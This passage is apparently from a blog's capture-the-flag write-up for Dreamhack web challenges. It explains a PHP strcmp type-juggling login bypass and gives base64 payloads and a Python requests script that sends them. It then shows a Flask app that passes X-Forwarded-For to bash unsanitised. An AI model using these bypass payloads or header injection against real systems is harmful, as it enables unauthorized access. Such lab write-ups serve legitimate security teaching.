<p>Login requires three values: <code>ID</code>, <code>PW</code> (password) and <code>OTP</code>. For ordinary users, we only need to know the admin’s ID and provide the correct OTP to log in</p>
<p>The program uses two functions <strong>generatePassword()</strong> and <strong>generateOTP()</strong> to generate the admin password and OTP. The password is a 32-character hexadecimal string, while the OTP is ‘P’ followed by a six-digit string. These values ​​are regenerated on every page load, so we need to attack on the same page load.</p>
<p>The <strong><code>login()</code></strong> function performs the actual login check. It first checks if <strong><code>cred</code></strong> is provided, then decodes and parses the value to check if the provided ID, PW and OTP are correct. If the ID is admin, the OTP provided is correct, and the PW provided matches the password of admin, the flag will be displayed.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$cred</span>[<span class="string">&#x27;pw&#x27;</span>], <span class="variable">$GLOBALS</span>[<span class="string">&#x27;admin_pw&#x27;</span>])) &#123;</span><br><span class="line">     <span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Hello, admin! get the flag: &quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>strcmp() Function compares two strings, case sensitive</p>
<p>This function returns:</p>
<ul>
<li>0 - if the two strings are equal</li>
<li>&lt;0 - if string1 is less than string2</li>
<li><blockquote>
<p>0 - if string1 is greater than string2</p>
</blockquote>
</li>
</ul>
<p><code>$_POST[&#39;cred&#39;]</code> If set equal to an empty array, strcmp will return NULL. Some inherent weaknesses in PHP comparisons, NULL &#x3D;&#x3D; 0 will return true</p>
<p><strong><code>$_POST[&#39;cred&#39;]</code></strong> Contains all submitted form information</p>
<p>So, by reshaping the screen and intercepting</p>
<p><img src="/img/Dreamhack1_40.png" alt="Untitled"></p>
<p>The content to be given to cred needs to be converted through base64</p>
<p><code>&#123;&quot;id&quot;:&quot;admin&quot;,&quot;pw&quot;:[],&quot;otp&quot;:true&#125;</code> &gt; <code>eyJpZCI6ImFkbWluIiwicHciOltdLCJvdHAiOnRydWV9</code></p>
<p>or </p>
<p><code>&#123;&quot;id&quot;:&quot;admin&quot;,&quot;pw&quot;:[],&quot;otp&quot;:0&#125;</code> &gt; <code>eyJpZCI6ImFkbWluIiwicHciOltdLCJvdHAiOjB9</code></p>
<p><img src="/img/Dreamhack1_41.png" alt="Untitled"></p>
<p>Replace the value of cred</p>
<p><img src="/img/Dreamhack1_42.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_43.png" alt="Untitled"></p>
<p>or write a code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests,json,base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://host3.dreamhack.games:24086/&#x27;</span></span><br><span class="line">packet = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pw&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;otp&quot;</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;cred&#x27;</span> : base64.<span class="title function_ invoke__">b64encode</span>(json.<span class="title function_ invoke__">dumps</span>(packet).<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">decode</span>()&#125;</span><br><span class="line">flag = requests.<span class="title function_ invoke__">post</span>(url, data)</span><br><span class="line"><span class="keyword">print</span>(flag.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_44.png" alt="Untitled"></p>
<hr>
<h3 id="what-is-my-ip"><a href="#what-is-my-ip" class="headerlink" title="what-is-my-ip"></a><strong>what-is-my-ip</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>How are they aware of us even behind the wall?</strong></p>
<ul>
<li><strong>FYI</strong></li>
</ul>
<p><strong>Flag Location: <code>/flag</code></strong></p>
<p>Flag Format: <code>DH&#123;...&#125;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> run, TimeoutExpired</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    user_ip = request.access_route[<span class="number">0</span>] <span class="keyword">if</span> request.access_route <span class="keyword">else</span> request.remote_addr</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = run(</span><br><span class="line">            [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">f&quot;echo <span class="subst">&#123;user_ip&#125;</span>&quot;</span>],</span><br><span class="line">            capture_output=<span class="literal">True</span>,</span><br><span class="line">            text=<span class="literal">True</span>,</span><br><span class="line">            timeout=<span class="number">3</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;ip.html&quot;</span>, result=result.stdout)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> TimeoutExpired:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;ip.html&quot;</span>, result=<span class="string">&quot;Timeout!&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">3000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>When you open the page, you can pay attention to</p>
<p><img src="/img/Dreamhack1_45.png" alt="Untitled"></p>
<p>This section of the code gets the IP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_ip = **request.access_route[<span class="number">0</span>] <span class="keyword">if</span> request.access_route <span class="keyword">else</span> request.remote_addr**</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>request.access_route[0]</code> represents the first IP address before passing through the proxy</strong></li>
<li><strong><code>request.access_route</code></strong> is a Flask-specific property used to access the list of IP addresses in the path passed by the user request</li>
<li>If the user’s request goes through a proxy, this list will include all IP addresses before the proxy</li>
<li>The proxy will put the user’s original IP address in the <strong><code>X-Forwarded-For</code></strong> of the HTTP header. This header may contain one or more IP addresses, each IP address represents an agent passed through</li>
<li>If <strong><code>request.access_route</code></strong> can be accessed, then <strong><code>request.access_route[0]</code></strong> will be the user’s original IP address</li>
<li>If <strong><code>request.access_route</code></strong> cannot be accessed, <strong><code>request.remote_addr</code></strong> will be used to obtain the user’s IP address, which is another method provided by Flask</li>
<li>The <strong><code>X-Forwarded-For</code></strong> header is usually used when a user’s request goes through a proxy server. The proxy server usually adds the user’s original IP address to the **<code>X-Forwarded-For</code>* header. * header so that the backend server can know the true source of the request</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	result = run(</span><br><span class="line">		[<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">f&quot;echo <span class="subst">&#123;user_ip&#125;</span>&quot;</span>],</span><br><span class="line">		capture_output=<span class="literal">True</span>,</span><br><span class="line">		text=<span class="literal">True</span>,</span><br><span class="line">		timeout=<span class="number">3</span>,</span><br><span class="line">	)</span><br></pre></td></tr></table></figure>

<p>This program does not verify user_ip and may be able to inject it</p>
<p>For requests with nginx reverse proxy, you need to add the following content to the nginx configuration:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>X-Forwarded-For</code> is used to identify the source of HTTP requests</li>
<li>This is not required if the client connects directly to the server</li>
<li>If the client HTTP connection goes through an intermediary such as a proxy server or load balancer, the server will only have the IP address of the device that most recently forwarded the message</li>
<li>Used to identify the original IP address of a client connecting to a web server through a proxy server</li>
<li><strong>Default http request <code>X-Forwarded-For</code> does not contain header</strong></li>
</ul>
<p>You can add a line X-Forwarded-For after burp interception</p>
<p><img src="/img/Dreamhack1_46.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_47.png" alt="Untitled"></p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/12/21/C_Cpp/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          C And C++ Zero To Hero?
        
      </div>
    </a>
  
  
    <a href="/2024/12/21/Crackme2/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">IDA - Crack me2</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>





</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2024 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>